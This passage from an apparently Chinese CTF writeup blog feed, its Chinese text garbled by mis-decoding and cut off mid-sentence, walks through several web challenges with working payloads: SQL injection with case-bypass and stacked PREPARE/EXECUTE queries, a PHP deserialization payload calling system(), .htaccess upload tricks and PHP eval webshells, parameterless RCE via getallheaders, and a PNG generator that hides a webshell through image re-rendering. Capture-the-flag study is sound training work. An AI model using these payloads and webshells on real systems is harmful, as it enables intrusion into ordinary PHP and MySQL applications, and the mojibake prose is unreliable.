æ­£å¸¸å›æ˜¾ï¼Œå­—ç¬¦å‹æ³¨å…¥  <span class="hljs-comment">// and è¢«è¿‡æ»¤äº†ï¼Œè¯•äº†è¯•ANDç»“æœå‘ç°æˆåŠŸç»•è¿‡</span><br>å¦‚æœæƒ³åœ¨URLä¸­ç”¨#è¿™ä¸ªæ³¨é‡Šç¬¦è¦ç¼–ç æˆ<span class="hljs-operator">%</span><span class="hljs-number">23</span>,å¤ªä¹…æ²¡åšSQLæ³¨å…¥äº†ï¼Œä¸€å¼€å§‹æŠŠè¿™èŒ¬å¿˜äº†ã€‚<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; oRdeR by <span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   åˆ¤æ–­å‡ åˆ—<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=-</span><span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   åˆ¤æ–­å›æ˜¾ä½ï¼Œè¿™äº”ä¸ªæ•°å­—åŒæ—¶å›æ˜¾<br>åé¢å°±æ˜¯æ­£å¸¸æ‰‹æ³¨è¿‡ç¨‹ã€‚<br>ä¸€å¼€å§‹ä»¥ä¸ºç›´æ¥ç”¨preg_matchçš„ <span class="hljs-operator">/</span>iæ¨¡å¼æŠŠå¤§å°å†™éƒ½æ­£åˆ™åŒ¹é…æ‰äº†ï¼Œåé¢å‘ç°å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ã€‚æœ¬æ¥è¿˜æƒ³å°è¯•ASCIIç¼–ç ç»•è¿‡ï¼Œå¼„äº†å¾ˆä¹…éƒ½æ²¡æˆåŠŸï¼Œæ‰¾äº†ä¸‹å‘ç°è¿™ç§æ–¹å¼åœ¨æŸäº›ç‰ˆæœ¬çš„mysqlä¸­ä¸èƒ½ç”¨äº†ã€‚ã€‚<br>https<span class="hljs-operator">:</span><span class="hljs-comment">//xz.aliyun.com/t/10594#toc-6</span><br></code></pre></td></tr></table></figure><h2 id="Unserializeï¼Ÿ"><a href="#Unserializeï¼Ÿ" class="headerlink" title="Unserializeï¼Ÿ"></a>Unserializeï¼Ÿ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-comment">// privateå±æ€§ï¼Œåºåˆ—åŒ–åä¼šåœ¨å±æ€§å‰ååˆ†åˆ«åŠ ç©º(\00,è½¬æˆURL%00)ï¼Œæ„å»ºpayloadè¦ç”¨rawurlencode</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">__destruct</span>é­”æœ¯æ–¹æ³•ï¼Œååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//ç®€å•çš„è¿‡æ»¤ï¼Œæƒ³è¯»æ–‡ä»¶çš„åŒ–å¯ä»¥ç”¨c&#x27;&#x27;atï¼Œca$&#123;Z&#125;tç­‰ç»•è¿‡</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//çœ‹çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//å½“å‰æ–‡ä»¶å¤¹ä¸‹ç»“æœï¼šindex.php</span><br></code></pre></td></tr></table></figure><p><img src="/img/unser1.png" alt="unser1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>; <span class="hljs-comment">//çœ‹äº†wpå‘ç°ç›´æ¥ç”¨headè¯»ä¹Ÿè¡Œ</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;aa2dff68-42ce-46b0-a7d7-bb1d8a524896&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/img/upload2.png" alt="upload2"></p><p>è‚¯å®šæ¯”week1è¿‡æ»¤æ›´ä¸¥æ ¼äº†ï¼Œä¸Šä¼ htaccess.å‘ç°ä¸Šä¼ æˆåŠŸï¼Œå†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test1.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>å†ä¸Šä¼ <code>test1.png</code>ï¼Œé…ç½®æ–‡ä»¶çš„å­˜åœ¨å¯ä»¥æŠŠ<code>test1.png</code>å½“æˆ<code>php</code>æ–‡ä»¶ï¼Œä»¥æ„é€ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;viper&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;notbad&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ è·¯å¾„ç›´æ¥å›æ˜¾å°±ä¸ç”¨<code>F12</code>å»æ‰¾äº†ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹çœ‹æ˜¯å¦è®¿é—®æˆåŠŸï¼Œç„¶åç›´æ¥ç”¨èšå‰‘è¿å°±èƒ½æ‹¿<code>flag</code>ï¼š</p><p><code>flag&#123;99c580dd-c75e-41f2-89da-4741ab19f655&#125;</code></p><p>åé¢çœ‹wpçŸ¥é“å®ƒæ˜¯æ£€æŸ¥äº†æ–‡ä»¶å†…å®¹ï¼š<code>&lt;?</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç›´æ¥ç”¨<code>dirsearch</code>æ‰«ï¼š</p><p><code>dirsearch -u http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/RCE1.png" alt="RCE1"></p><p><code>.git</code>æ³„éœ²ï¼Œåˆ‡æ¢æˆæ ¹ç”¨æˆ·<code>python2 GitHack.py http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/.git</code></p><p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>index.php</code>ä¸€ä¸ª<code>bo0g1pop.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸ª<code>((?R)?\)</code>ï¼Œå…¸å‹æ— å‚æ•°RCEã€‚</p><p>æ— å‚æ•°RCEç”¨çš„æ¯”è¾ƒå¤šçš„æ–¹æ³•æœ‰<code>getallheaders()</code>ï¼Œ<code>get_defined_var()</code>,<code>session_id</code>ã€‚è¿™é¢˜è¿‡æ»¤äº†<code>get_defined_vars</code>ï¼Œæ‰€ä»¥å°è¯•ç”¨å¦å¤–ä¸¤ç§ã€‚</p><p>å…ˆ<code>print_r(getallheaders())</code>çœ‹çœ‹ä»¥æ•°ç»„å½¢å¼è¿”å›çš„åŒ…å¤´æ˜¯ä»€ä¹ˆé¡ºåºçš„ï¼Œæ­£åºè¿˜æ˜¯å€’å™ï¼Ÿéƒ½è¿”å›å“ªäº›ï¼Ÿ</p><p><code>/bo0g1pop.php/?star=print_r(getallheaders());</code></p><p><img src="/img/rce22.png" alt="rce22"></p><p>æ­£åºå›æ˜¾ä»¥ä¸Šå†…å®¹ï¼Œæ„å»º<code>payload</code>:</p><p><code>?star=eavl(next(getallheaders()));</code> å¹¶æŠŠUser-Agentå¤´æ”¹æˆ<code>system(&#39;ls&#39;);</code></p><p><img src="/img/rce4.png" alt="rce4"></p><p><img src="/img/rce3.png" alt="rce3"></p><p>åé¢å‘½ä»¤æ”¹æˆ<code>cat /flag</code>å³å¯</p><p>è™½ç„¶Hostå¤´ç¬¬ä¸€ä½å°±å›æ˜¾äº†ï¼Œä½†ä¸èƒ½é€šè¿‡æ”¹Hostå¤´å»æ‰§è¡Œå‘½ä»¤ï¼Œå¦åˆ™ä¼šå¼¹400ã€‚æˆ–è€…åˆ©ç”¨<code>array_reverse</code>æ”¹æœ€åå›æ˜¾é‚£ä¸ª<code>X-Forwarded-Proto</code>å¤´ä¹Ÿè¡Œ</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week2</title>
    <link href="/2023/10/01/%5BWeek%202%5D%20ez_upload/"/>
    <url>/2023/10/01/%5BWeek%202%5D%20ez_upload/</url>
    
    <content type="html"><![CDATA[<p>0xGameç¬¬äºŒå‘¨ï¼Œåœ¨å¸ˆå‚…å·²ç»ç»™äº†å¤§é‡æç¤ºçš„æƒ…å†µä¸‹åªåšå‡ºä¸¤ä¸ªé¢˜:(</p><span id="more"></span><hr><h3 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h3><p>æ ¹æ®é¢˜ç›®çŒœæµ‹ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆæ‰“å¼€é¢˜ç›®çš„é™„ä»¶çœ‹çœ‹æœ‰å•¥ä¸œè¥¿ï¼Œå‘ç°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶åˆ©ç”¨<code>imagecreatefromç‚¹ç‚¹ç‚¹()</code>å’Œ<code>imageç‚¹ç‚¹ç‚¹()</code>è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼Œä¸»è¦éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//è·å¾—æ–‡ä»¶ç±»å‹ï¼Œcontent-typeï¼Œä¸Šä¼ ä¸€å¥è¯ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯ç»•ç‹—</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åˆšåˆšä¸Šä¼ çš„GIFï¼Œç»™source</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="hljs-comment">//è·å¾—æ–‡ä»¶åç¼€ï¼Œå½“å‡ºç°å¤šä¸ª . æ—¶ï¼Œç»“æœä¸ºæœ€åä¸€ä¸ª . åé¢çš„å†…å®¹ã€‚</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>; <span class="hljs-comment">//å°†æ–‡ä»¶åŸå§‹åmd5åŠ å¯†åå’Œuser_diræ‹¼æ¥ï¼Œåé¢åŠ ä¸ª.åç¼€ã€‚è¿™ä¸œè¥¿ä½œä¸ºæ–‡ä»¶çš„å­˜å‚¨è·¯å¾„</span><br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//å†æ¬¡æ£€éªŒæ–‡ä»¶ç±»å‹</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<span class="hljs-comment">//å°†$sourceä¿å­˜åˆ°$filepathä¸­ï¼Œ</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>: <span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å»ç½‘ä¸ŠæŸ¥äº†æœ‰å…³äºŒæ¬¡æ¸²æŸ“ç»•è¿‡çš„èµ„æ–™ï¼Œå‘ç°æœ‰äº›é¢˜ç›®æ˜¯äºŒæ¬¡æ¸²æŸ“é…åˆ<code>include</code>å‡½æ•°å†ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†è¿™é¢˜æ²¡ç»™<code>include</code>å‡½æ•°ï¼Ÿæ ¹æ®å¸ˆå‚…çš„æç¤ºæœç´¢äº†ç”Ÿæˆç”¨äºç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ”¾æœ¬åœ°è¿è¡Œä¸€ä¸‹ï¼Œç”Ÿæˆ<code>1.png</code>ï¼Œæ”¾åˆ°HexCmpä¸‹çœ‹çœ‹ï¼š</p><p><img src="/img/ul1.png" alt="ul1"></p><p>æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>&lt;?=$_GET[0]($_POST[1]);?&gt;//GET0ä¼ å‡½æ•°åï¼ŒPOST1ä¼ å‚æ•°</code></p><p>å…ˆåç¼€æ”¹æˆ<code>php</code>ï¼Œä¸Šä¼ æ—¶æŠ“åŒ…æŠŠcontent-typeå­—æ®µæ”¹æˆ<code>image/png</code>ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®URLï¼š</p><p><img src="/img/ul2.png" alt="ul2"></p><p>æˆåŠŸï¼Œ<code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=ls;</code>ï¼Œå…ˆçœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><p><img src="/img/ul3.png" alt="ul3"></p><p><code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=ls /;</code>ï¼Œçœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><p><img src="/img/ul4.png" alt="ul4"></p><p><code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=cat /flag;</code>ï¼Œå¾—åˆ°<code>flag</code>:</p><p><code>0xGame&#123;4611f622-8577-4ac4-8f85-0b787730800c&#125;</code></p><h3 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h3><p><code>url:http://120.27.148.152:50021/?order=email</code>ï¼Œå¸ˆå‚…æç¤ºæ˜¯å †å æ³¨å…¥ï¼Œè€Œä¸”ç›´æ¥<code>select flag from flag</code>å°±èƒ½æ‹¿ç­”æ¡ˆã€‚</p><p>ç»™äº†é™„ä»¶ï¼Œçœ‹ä¸‹æºç é‡Œé»‘åå•éƒ½æœ‰å•¥ï¼š</p><p><code>blacklist = [&#39;select&#39;, &#39;update&#39;, &#39;insert&#39;, &#39;delete&#39;, &#39;database&#39;, &#39;table&#39;, &#39;column&#39;, &#39;alter&#39;, &#39;create&#39;, &#39;drop&#39;, &#39;and&#39;, &#39;or&#39;, &#39;xor&#39;, &#39;if&#39;, &#39;else&#39;, &#39;then&#39;, &#39;where&#39;]</code></p><p><code>?order=id;show tables</code>è¿™ç§æ²¡æ³•ç”¨äº†ï¼Œæ ¹æ®å¸ˆå‚…æç¤ºå¯ä»¥ä½¿ç”¨<code>prepare</code>å’Œ<code>execute</code>ç»“åˆæ‰§è¡Œï¼Œæœ‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>));<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br></code></pre></td></tr></table></figure><p>ä½†selectè¢«è¿‡æ»¤æ‰äº†ï¼Œç©ºæ 